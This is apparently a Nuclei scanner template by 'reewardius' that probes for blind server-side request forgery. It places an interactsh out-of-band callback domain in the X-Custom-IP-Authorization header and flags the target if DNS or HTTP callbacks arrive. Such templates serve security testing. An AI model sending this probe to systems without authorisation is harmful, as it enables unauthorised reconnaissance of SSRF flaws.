id: 0x036

info:
  name: Blind SSRF
  author: reewardius
  severity: high
  tags: ssrf

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Custom-IP-Authorization: {{Host}}.{{Port}}.BSSRF-036.{{interactsh-url}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Cache-Control: no-transform
        Accept-Encoding: gzip, deflate
        Accept: */*

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or